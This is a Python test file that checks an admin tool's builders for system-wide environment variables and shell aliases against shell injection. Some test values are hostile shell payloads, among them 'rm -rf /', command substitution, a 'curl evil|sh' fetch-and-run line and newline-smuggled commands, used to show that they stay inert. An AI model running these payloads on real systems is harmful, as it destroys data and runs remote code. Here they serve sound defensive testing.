"""
Environment & Shell tools: persistent system-wide environment variables and shell
aliases written to /etc/profile.d drop-ins. Verifies the command builders are
injection-safe (name whitelisted, value/command shlex-quoted + newline-rejected,
written with a quoted printf so nothing breaks out into the shell), idempotent
(replace-not-append), and that the console catalog exposes the new tool.
"""
import shlex

import pytest

from client import api as capi


# --------------------------------------------------------------------------- #
# env var builder                                                             #
# --------------------------------------------------------------------------- #
def test_set_env_var_basic_shape():
    cmd = capi.cmd_set_env_var("JAVA_HOME", "/usr/lib/jvm/default")
    assert "/etc/profile.d/sysible-env.sh" in cmd
    assert "sed -i '/^export JAVA_HOME=/d'" in cmd          # idempotent replace
    assert "export JAVA_HOME=/usr/lib/jvm/default" in cmd    # the written line
    assert "printf '%s\\n'" in cmd


def test_set_env_var_rejects_bad_name():
    for bad in ("1FOO", "FO O", "foo;bar", "PATH=x", "", "../x", "a-b"):
        with pytest.raises(ValueError):
            capi.cmd_set_env_var(bad, "x")


def _bash_syntax_ok(cmd):
    import subprocess
    return subprocess.run(["bash", "-n", "-c", cmd]).returncode == 0


def test_set_env_var_value_is_injection_safe():
    # A hostile value must be embedded ONLY as a doubly-quoted printf argument, so
    # it is written as inert DATA and can never execute.
    payload = "$(id); rm -rf / #"
    cmd = capi.cmd_set_env_var("FOO", payload)
    expected_line = f"export FOO={shlex.quote(payload)}"      # the file line (value single-quoted)
    assert shlex.quote(expected_line) in cmd                  # printf arg is that line, re-quoted
    assert _bash_syntax_ok(cmd)                               # payload didn't break the command's quoting


def test_set_env_var_rejects_newline_value():
    with pytest.raises(ValueError):
        capi.cmd_set_env_var("FOO", "bar\nexport EVIL=1")


def test_unset_env_var():
    cmd = capi.cmd_unset_env_var("FOO")
    assert "sed -i '/^export FOO=/d'" in cmd
    with pytest.raises(ValueError):
        capi.cmd_unset_env_var("bad name")


# --------------------------------------------------------------------------- #
# alias builder                                                               #
# --------------------------------------------------------------------------- #
def test_set_alias_basic_shape():
    cmd = capi.cmd_set_alias("ll", "ls -alF")
    assert "/etc/profile.d/sysible-aliases.sh" in cmd
    assert "sed -i '/^alias ll=/d'" in cmd
    # The written file line is `alias ll='ls -alF'`; in the command it is the
    # shlex-quoted argument to printf (the value never appears un-quoted).
    assert shlex.quote("alias ll='ls -alF'") in cmd


def test_set_alias_injection_safe_and_validated():
    payload = "git status; curl evil|sh"
    cmd = capi.cmd_set_alias("gs", payload)
    expected_line = f"alias gs={shlex.quote(payload)}"
    assert shlex.quote(expected_line) in cmd
    assert _bash_syntax_ok(cmd)
    for bad in ("1x", "a b", "a;b", ""):
        with pytest.raises(ValueError):
            capi.cmd_set_alias(bad, "ls")
    with pytest.raises(ValueError):
        capi.cmd_set_alias("ll", "")                 # empty command rejected
    with pytest.raises(ValueError):
        capi.cmd_set_alias("ll", "ls\nrm -rf /")     # newline rejected


def test_remove_alias():
    cmd = capi.cmd_remove_alias("ll")
    assert "sed -i '/^alias ll=/d'" in cmd


def test_env_var_end_to_end_writes_inert_data(tmp_path):
    # Actually run the generated command (redirected to a temp file) with a hostile
    # value, and prove it is stored VERBATIM as data — not executed — and that a
    # re-set replaces rather than appends (idempotent).
    import subprocess
    target = tmp_path / "sysible-env.sh"
    payload = "$(touch /tmp/sysible_pwned); rm -rf / #"
    marker = tmp_path / "pwned_marker"
    cmd = capi.cmd_set_env_var("FOO", payload).replace(
        "/etc/profile.d/sysible-env.sh", str(target))
    # Point any command-substitution side effect at a detectable marker path.
    cmd = cmd.replace("/tmp/sysible_pwned", str(marker))
    subprocess.run(["bash", "-c", cmd], check=True)
    subprocess.run(["bash", "-c", cmd], check=True)          # run twice (idempotent)
    content = target.read_text()
    assert content.count("export FOO=") == 1                 # replaced, not duplicated
    assert not marker.exists()                               # the $(...) never executed
    # Sourcing the file yields the literal value verbatim (stored as data). The value
    # carries the marker-path substitution the test applied above.
    stored = payload.replace("/tmp/sysible_pwned", str(marker))
    out = subprocess.run(
        ["bash", "-c", f"set -a; . {shlex.quote(str(target))}; printf '%s' \"$FOO\""],
        capture_output=True, text=True, check=True)
    assert out.stdout == stored


# --------------------------------------------------------------------------- #
# console catalog exposes the new tool                                        #
# --------------------------------------------------------------------------- #
def test_catalog_has_environment_and_shell_tool():
    from webgui import actions
    cat = {t["tool"]: t for t in actions.catalog()}
    assert "Environment & Shell" in cat
    names = {a["name"] for a in cat["Environment & Shell"]["actions"]}
    assert {"env_set_var", "env_unset_var", "env_set_alias", "env_remove_alias", "env_list"} <= names
    # The set-var action exposes name + value params.
    setvar = next(a for a in cat["Environment & Shell"]["actions"] if a["name"] == "env_set_var")
    pnames = {p["name"] for p in setvar["params"]}
    assert {"name", "value"} <= pnames
